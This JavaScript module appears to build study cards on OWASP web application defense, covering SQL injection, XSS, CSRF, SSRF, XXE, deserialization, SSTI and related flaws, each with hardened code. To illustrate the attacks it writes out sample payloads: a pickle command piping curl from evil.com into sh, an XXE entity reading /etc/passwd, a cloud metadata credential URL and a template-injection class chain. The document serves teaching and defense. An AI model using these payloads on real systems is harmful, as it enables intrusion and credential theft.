// scripts/data_security/cat05_owasp_defense.cjs
const { card } = require('../sec_builder_helper.cjs');

const cat = "OWASP Top 10 & Web Application Defense";

module.exports = [
  card(
    49,
    cat,
    "SQL Injection (SQLi) & AST Disruption",
    "must-know",
    "intermediate",
    "Why do parameterized queries eliminate SQL Injection at the compilation level, and why is simple string sanitization/escaping prone to failure?",
    "Parameterized queries (prepared statements) separate SQL code from user data in the database engine's query compiler. The Abstract Syntax Tree (AST) is parsed and compiled before user inputs are bound, treating inputs strictly as literal values rather than executable syntax.",
    "String escaping (e.g. replacing ' with \\') fails because attackers bypass escaping using multi-byte character encoding tricks (like GBK / Big5 in MySQL), numeric injection without quotes (WHERE id = 1 OR 1=1), or nested string decoding bugs. In a prepared statement: 1) The database parser receives the SQL template 'SELECT * FROM users WHERE email = ?'; 2) The parser constructs the execution tree with an immutable placeholder; 3) The input string \"' OR '1'='1\" is bound directly to the parameter register; 4) The database searches for an exact email literal matching that entire string, making SQL structure modification impossible.",
    `// VULNERABLE TO SQLi (String Concatenation alters AST):
// const query = \`SELECT * FROM accounts WHERE user_id = '\${req.body.id}'\`;

// IMMUNE TO SQLi (Parameterized Prepared Statement):
import { Pool } from 'pg';
const pool = new Pool();

export async function getUserAccount(userId: string) {
  // Input parameters are sent over the wire in separate binary wire protocol frames!
  const result = await pool.query(
    'SELECT id, balance, status FROM accounts WHERE user_id = $1',
    [userId]
  );
  return result.rows[0];
}`,
    "Never concatenate or interpolate variables into SQL strings. Always use parameterized queries ($1, $2 or ?) across raw SQL and ORMs.",
    ["sqli", "prepared-statements", "parameterized-queries", "owasp-top-10"]
  ),
  card(
    50,
    cat,
    "Cross-Site Scripting (XSS): Reflected, Stored & DOM-Based",
    "must-know",
    "intermediate",
    "What are the distinct execution lifecycles of Reflected, Stored, and DOM-based XSS, and how does Context-Aware Output Encoding neutralize them?",
    "XSS occurs when an application executes untrusted user input within the browser context. Reflected XSS echoes input immediately from HTTP request parameters; Stored XSS persists malicious payloads in databases; DOM-based XSS occurs entirely client-side when JavaScript sinks consume unsafe sources.",
    "The 3 XSS variants: 1) Reflected: Attacker sends a phishing link: https://app.com/search?q=<script>...; server renders the string unencoded; executes once in victim's browser; 2) Stored: Attacker posts a comment containing malicious script; stored in database; every user visiting the forum executes the payload; 3) DOM-based: Server response is benign, but client JS executes: document.getElementById('name').innerHTML = location.hash. Mitigations require Context-Aware Output Encoding (HTML entity encoding inside HTML body, JS string escaping inside scripts, URI encoding inside hrefs) and avoiding dangerous sinks (innerHTML, eval, document.write).",
    `// Safe Rendering in Modern Frameworks:
// React automatically escapes JSX expressions:
// <div>{userInput}</div> -> Encoded as &lt;script&gt; (Safe!)

// DANGEROUS React Sink:
// <div dangerouslySetInnerHTML={{ __html: userInput }} /> // VULNERABLE!

// Remediation when rich HTML must be rendered: DOMPurify Sanitization
import DOMPurify from 'isomorphic-dompurify';

export function SafeRichText({ rawHtml }: { rawHtml: string }) {
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}`,
    "Modern frontend frameworks (React, Angular) encode values by default. Vulnerabilities occur when developers intentionally bypass protection via innerHTML or dangerouslySetInnerHTML.",
    ["xss", "stored-xss", "dom-xss", "dompurify", "output-encoding"]
  ),
  card(
    51,
    cat,
    "Content Security Policy (CSP) & Strict Nonce Architectures",
    "must-know",
    "intermediate",
    "How does a strict nonce-based Content Security Policy (CSP) provide mathematical defense against script injection?",
    "A strict nonce-based CSP instructs the browser to execute only inline scripts that possess a matching cryptographically random, unpredictable nonce attribute generated per HTTP request, blocking all injected scripts.",
    "Legacy CSPs that relied on domain whitelists (script-src 'self' https://trusted.com) were frequently bypassed through JSONP endpoints, CDN script hosting, and open redirects on whitelisted domains. Modern CSP (CSP Level 3) uses strict nonces: 1) The server generates a high-entropy 128-bit random base64 nonce on every single request; 2) The server injects the nonce into the HTTP header: Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic'; 3) The server adds the matching nonce to legitimate script tags: <script nonce=\"{RANDOM}\">; 4) Injected scripts from XSS payloads lack the unique secret nonce and are blocked by the browser engine.",
    `// Production Nonce Generation Middleware (Next.js / Express)
import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';

export function cspNonceMiddleware(req: Request, res: Response, next: NextFunction) {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  const cspHeader = [
    "default-src 'self'",
    \`script-src 'self' 'nonce-\${nonce}' 'strict-dynamic' https:\`,
    \`style-src 'self' 'nonce-\${nonce}'\`,
    "object-src 'none'",
    "base-uri 'self'",
    "frame-ancestors 'none'"
  ].join('; ');

  res.setHeader('Content-Security-Policy', cspHeader);
  next();
}`,
    "Strict CSP with 'strict-dynamic' and per-request nonces is the single most effective HTTP defense-in-depth header against zero-day XSS attacks.",
    ["csp", "content-security-policy", "strict-nonce", "xss-defense"]
  ),
  card(
    52,
    cat,
    "Cross-Site Request Forgery (CSRF) & Modern Mitigations",
    "must-know",
    "intermediate",
    "How does Cross-Site Request Forgery (CSRF) work and how do SameSite cookie flags and Anti-CSRF Synchronizer Tokens prevent forged state mutations?",
    "CSRF tricks an authenticated user's browser into executing unwanted state-mutating HTTP requests (e.g. POST /transfer) to a target application where the user is logged in, automatically including their stored session cookies.",
    "Because browsers historically attached cookies on all cross-origin requests, a malicious website (evil.com) hosting a hidden form could auto-submit a POST to bank.com/transfer. Mitigations: 1) SameSite=Lax/Strict cookie attribute: instructs browsers not to send cookies on cross-origin POST requests initiated by external sites; 2) Synchronizer Token Pattern (Anti-CSRF Tokens): a cryptographically unguessable token stored in the user's session and embedded in forms/headers; because evil.com cannot read the token (due to Same-Origin Policy), the forged request lacks a valid token; 3) Checking Origin and Referer request headers on all mutation requests.",
    `// Anti-CSRF Token Validation Middleware
import crypto from 'crypto';

export function verifyCsrfToken(req: Request, res: Response, next: NextFunction) {
  // Skip safe HTTP verbs (GET, HEAD, OPTIONS)
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const sessionToken = req.session?.csrfToken;
  const submittedToken = req.headers['x-csrf-token'] || req.body?._csrf;

  if (!sessionToken || !submittedToken || sessionToken !== submittedToken) {
    return res.status(403).json({ error: "CSRF token mismatch or missing." });
  }

  next();
}`,
    "While SameSite=Lax provides excellent baseline protection in modern browsers, anti-CSRF tokens and strict Origin header checks remain mandatory for sensitive financial/account mutations.",
    ["csrf", "samesite", "anti-csrf-token", "origin-header"]
  ),
  card(
    53,
    cat,
    "Server-Side Request Forgery (SSRF) & Cloud Metadata Defense",
    "must-know",
    "intermediate",
    "What is Server-Side Request Forgery (SSRF) and how do attackers exploit webhooks/URL fetchers to steal AWS IAM credentials via the metadata service?",
    "SSRF occurs when a backend server fetches a remote URL provided by a user without validating the IP address, allowing an attacker to force the server to issue HTTP requests to internal private IPs, loopback interfaces (127.0.0.1), or cloud metadata endpoints.",
    "In cloud environments, cloud instances can query the Instance Metadata Service (IMDS) at link-local IP 169.254.169.254 to retrieve temporary IAM credentials. If an application feature accepts a URL (e.g. 'Enter avatar image URL' or 'Webhook URL'), an attacker submits 'http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name'. The server fetches the URL and returns the private AWS keys to the attacker. Defenses: 1) Restrict IMDS to IMDSv2 (requiring PUT session token header, which SSRF cannot spoof); 2) DNS resolution verification: resolve hostname to IP and reject loopback/RFC 1918 private IPs; 3) Disable HTTP redirects in the HTTP client.",
    `import dns from 'dns/promises';
import ipaddr from 'ipaddr.js';

export async function validateSafeUrl(untrustedUrl: string): Promise<string> {
  const parsed = new URL(untrustedUrl);

  // 1. Only allow HTTP and HTTPS
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Disallowed protocol');
  }

  // 2. Resolve DNS to physical IP
  const addresses = await dns.resolve4(parsed.hostname);
  for (const ipStr of addresses) {
    const addr = ipaddr.parse(ipStr);
    
    // Block loopback (127.0.0.1), private RFC1918 (10.x, 192.168.x), and Link-Local (169.254.x)
    if (addr.range() !== 'unicast') {
      throw new Error(\`SSRF Blocked: Address \${ipStr} resolves to non-routable private range!\`);
    }
  }

  return untrustedUrl;
}`,
    "Always enforce AWS IMDSv2 across all EC2/ECS instances. IMDSv2 requires an HTTP PUT request with a special header to generate a session token, effectively neutralizing basic GET-based SSRF.",
    ["ssrf", "imdsv2", "cloud-metadata", "aws-security", "url-validation"]
  ),
  card(
    54,
    cat,
    "XML External Entity (XXE) Injection",
    "must-know",
    "intermediate",
    "How does XML External Entity (XXE) injection compromise servers, and how is it disabled in modern XML parsers?",
    "XXE occurs when an XML parser processes untrusted XML input containing a Document Type Definition (DTD) with external entity declarations, allowing attackers to read local system files (/etc/passwd) or launch internal network port scans.",
    "XML supports DTDs that define macros (entities). Attackers craft payloads like: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <data>&xxe;</data>. When the server parses the XML, the parser reads the file system and expands the entity into the output document. Defense requires explicitly disabling DTD processing and external entity resolution in XML parser configurations.",
    `// Disabling DTD and External Entities in XML Parsers
// Python defusedxml / Java DocumentBuilderFactory / Node.js libxmljs

// Node.js libxmljs hardened configuration:
/*
import libxmljs from 'libxmljs';

const xmlDoc = libxmljs.parseXml(untrustedXml, {
  dtdload: false,   // Disable loading external DTDs
  dtdvalid: false,  // Disable DTD validation
  noent: false,     // MUST be false: Do NOT expand external entities!
  nonet: true       // Disable network access during parsing
});
*/`,
    "Whenever parsing XML, always configure the parser with DTD processing completely disabled, or migrate to JSON/Protocol Buffers.",
    ["xxe", "xml-external-entity", "parser-hardening", "lfi"]
  ),
  card(
    55,
    cat,
    "Insecure Deserialization & Object Injection",
    "advanced",
    "advanced",
    "How does Insecure Deserialization lead to Remote Code Execution (RCE) and why should formats like Java Serialization, Python pickle, and PHP serialize be avoided?",
    "Insecure Deserialization occurs when untrusted serialized byte streams or language-native objects are restored into active memory, executing hidden 'magic methods' (gadget chains) that run arbitrary system commands during instantiation.",
    "Formats like Python's pickle, Java's ObjectInputStream, and Ruby's Marshal serialize not just raw data, but object state and callable class pointers. In Python, pickle invokes __reduce__() upon unpickling, allowing an attacker to construct a payload that executes os.system('curl evil.com/shell | sh'). In Java, libraries like commons-collections contain 'gadget chains' where chained reflections culminate in InvokerTransformer RCE. Defenses: 1) Never deserialize untrusted data with native language serializers; 2) Use pure, logic-free data interchange formats: JSON, Protocol Buffers, or MessagePack.",
    `// VULNERABLE (Python):
// user_obj = pickle.loads(untrusted_base64_data) # REMOTE CODE EXECUTION!

// SAFE REPLACEMENT:
// Use pure JSON with strict schema assertion
import { z } from 'zod';

const PayloadSchema = z.object({
  action: z.enum(['START', 'STOP', 'STATUS']),
  taskId: z.string().uuid()
});

export function parseIncomingMessage(jsonString: string) {
  const parsed = JSON.parse(jsonString); // JSON is pure data; cannot instantiate executable classes!
  return PayloadSchema.parse(parsed);
}`,
    "Never accept serialized binary language objects over untrusted network streams. Treat 'pickle.loads()' or 'unserialize()' on untrusted data as an instant RCE.",
    ["insecure-deserialization", "gadget-chains", "rce", "pickle-exploit"]
  ),
  card(
    56,
    cat,
    "Prototype Pollution in JavaScript & Node.js",
    "advanced",
    "advanced",
    "How does Prototype Pollution exploit deep merge/clone operations in JavaScript, and how does it lead to Denial of Service or RCE?",
    "Prototype Pollution occurs when an attacker injects properties into Object.prototype via properties like '__proto__', 'constructor', or 'prototype', corrupting every plain object across the entire Node.js runtime.",
    "Because almost all objects in JavaScript inherit from Object.prototype, if a recursive merge utility naively processes untrusted JSON: target[key] = source[key] where key is '__proto__', the property is attached to the global prototype. If the attacker pollutes Object.prototype.isAdmin = true, every newly created object in the application inherits isAdmin = true! Furthermore, polluting properties like child_process.execFile options (e.g. shell, env) can escalate into full Remote Code Execution.",
    `// Prototype Pollution Exploit Demonstration:
// const payload = JSON.parse('{"__proto__": {"polluted": true}}');
// merge({}, payload);
// console.log({}.polluted); // true! Global runtime poisoned!

// HARDENED DEEP CLONE FUNCTION:
export function safeDeepMerge(target: any, source: any) {
  for (const key of Object.keys(source)) {
    // 1. Blacklist prototype poisoning keys
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }

    if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
      if (!target[key]) target[key] = Object.create(null); // No prototype!
      safeDeepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}`,
    "Use Object.create(null) for dictionary lookup maps, and run Node.js with the flag '--disable-proto=delete' in high-security environments.",
    ["prototype-pollution", "nodejs-security", "object-prototype", "rce-exploit"]
  ),
  card(
    57,
    cat,
    "Path Traversal & Arbitrary File Disclosure",
    "must-know",
    "intermediate",
    "How do Path Traversal attacks (Directory Traversal) bypass filename validations, and how is path canonicalization enforced safely?",
    "Path Traversal occurs when user-supplied input is passed to filesystem APIs without canonicalization, allowing attackers to use dot-dot-slash sequence ('../../') to traverse outside the intended directory and read sensitive system files.",
    "Simple string blacklists (checking if filename.includes('..')) are easily bypassed using URL-encoding (%2e%2e%2f), double encoding (%252e%252e%252f), or null byte injection (%00). Secure path resolution requires path canonicalization (e.g. path.resolve) followed by verifying that the resolved absolute path starts with the trusted root directory prefix.",
    `import path from 'path';
import fs from 'fs/promises';

const UPLOAD_ROOT = path.resolve('/var/app/storage/uploads');

export async function readUserUploadedFile(untrustedFilename: string): Promise<Buffer> {
  // 1. Canonicalize and resolve absolute path
  const safePath = path.resolve(UPLOAD_ROOT, untrustedFilename);

  // 2. Strict prefix validation: Guarantees resolved path is WITHIN UPLOAD_ROOT
  if (!safePath.startsWith(UPLOAD_ROOT + path.sep)) {
    throw new Error("Access Denied: Path traversal attempt detected!");
  }

  // 3. Safe to read
  return await fs.readFile(safePath);
}`,
    "Always resolve user-supplied file paths using path.resolve() and assert that the resulting string starts with the expected base directory plus path.sep.",
    ["path-traversal", "directory-traversal", "arbitrary-file-read", "filesystem-security"]
  ),
  card(
    58,
    cat,
    "Open Redirect Vulnerabilities & Phishing Defense",
    "must-know",
    "beginner",
    "What is an Open Redirect vulnerability and what validation patterns prevent attackers from abusing login return URLs?",
    "An Open Redirect occurs when an application accepts an untrusted URL parameter (e.g. /login?returnTo=https://evil.com) and redirects the user without verifying the destination, allowing attackers to use the legitimate company domain to stage convincing phishing attacks.",
    "Victims trust the genuine brand link: https://mybank.com/login?redirect=https://phishing-bank.com. After logging in, the victim is seamlessly redirected to the phishing site that requests their credit card or MFA code. Remediation requires: 1) Strict domain whitelisting; 2) Forcing relative-only URLs: verifying the path starts with a single forward slash '/' and NOT '//' (which browsers interpret as protocol-relative URLs: '//evil.com' -> 'https://evil.com'); 3) Parsing destination with the URL constructor.",
    `export function getSafeRedirectUrl(untrustedRedirect: string | null, fallbackUrl: string = '/dashboard'): string {
  if (!untrustedRedirect) return fallbackUrl;

  try {
    // Check if it's a relative path on same origin
    if (untrustedRedirect.startsWith('/') && !untrustedRedirect.startsWith('//')) {
      return untrustedRedirect;
    }

    // If absolute URL, enforce strict origin whitelist
    const parsed = new URL(untrustedRedirect);
    const ALLOWED_ORIGINS = ['https://app.enterprise.com', 'https://billing.enterprise.com'];

    if (ALLOWED_ORIGINS.includes(parsed.origin)) {
      return untrustedRedirect;
    }
  } catch {
    // Malformed URL, return fallback
  }

  return fallbackUrl;
}`,
    "Beware of '//evil.com'. Browsers treat leading double slashes as protocol-relative URLs. Always verify startsWith('/') AND !startsWith('//').",
    ["open-redirect", "phishing", "url-validation", "login-flow"]
  ),
  card(
    59,
    cat,
    "Server-Side Template Injection (SSTI)",
    "advanced",
    "advanced",
    "What is Server-Side Template Injection (SSTI) and how does it escalate into Remote Code Execution across template engines?",
    "SSTI occurs when user input is concatenated directly into a template file rather than passed as a data context variable, allowing attackers to inject template syntax (e.g. {{ 7 * 7 }} or {{ config.__class__ }}) that executes arbitrary server-side code.",
    "In engines like Jinja2 (Python), Twig (PHP), Pug, or EJS (Node.js), developers sometimes mistakenly generate templates dynamically: engine.render('Hello ' + req.query.name). If the attacker submits '{{ 7*7 }}', the output displays 'Hello 49', confirming SSTI. Attackers then traverse the language's class hierarchy (in Python: ''.__class__.__mro__[1].__subclasses__()) to locate subprocess.Popen and execute arbitrary shell commands. Defense requires strictly separating static template files from dynamic variable contexts.",
    `// VULNERABLE (Concatenating user input into template string):
// const template = \`<h1>Welcome \${req.query.username}</h1>\`;
// const html = ejs.render(template, {}); // RCE!

// HARDENED (Static Template with Data Context):
const staticTemplate = '<h1>Welcome <%= username %></h1>';
const html = ejs.render(staticTemplate, {
  username: req.query.username // Safely escaped data context!
});`,
    "Never construct template strings dynamically using string concatenation with user input. Keep templates static and pass data exclusively via context dictionaries.",
    ["ssti", "template-injection", "rce", "template-engines"]
  ),
  card(
    60,
    cat,
    "Mass Assignment & Over-Posting Vulnerabilities",
    "must-know",
    "intermediate",
    "How does Mass Assignment (Over-Posting) compromise applications and how does strict DTO schema validation prevent unauthorized property binding?",
    "Mass Assignment occurs when an application automatically binds all client-supplied HTTP request properties directly into internal database models or objects (e.g. User.update(req.body)), allowing attackers to inject privileged fields like 'isAdmin': true or 'role': 'admin'.",
    "Frameworks and ORMs (Prisma, TypeORM, Rails, Spring Boot) often provide convenience methods to map JSON request bodies directly to database entities. If an attacker submits { \"email\": \"user@test.com\", \"role\": \"SUPER_ADMIN\", \"isVerified\": true }, an unhardened endpoint overwrites those internal columns. Defense: 1) Never bind raw req.body to database mutations; 2) Enforce strict Data Transfer Object (DTO) schemas using Zod or class-validator that strip or reject unwhitelisted fields.",
    `import { z } from 'zod';

// Explicit DTO: Whitelist ONLY the fields a user is permitted to edit!
const UpdateProfileDto = z.object({
  displayName: z.string().min(2).max(50),
  bio: z.string().max(250).optional(),
  // 'role', 'isAdmin', 'tenantId', 'credits' are completely omitted from DTO
}).strict(); // .strict() rejects requests containing unexpected extra fields!

export async function handleUpdateProfile(reqBody: unknown, userId: string) {
  const sanitized = UpdateProfileDto.parse(reqBody);

  return await db.user.update({
    where: { id: userId },
    data: sanitized // Guaranteed safe!
  });
}`,
    "Always use strict DTOs. Never pass raw request payloads directly into database update or create calls.",
    ["mass-assignment", "over-posting", "zod-dto", "orm-security"]
  )
];
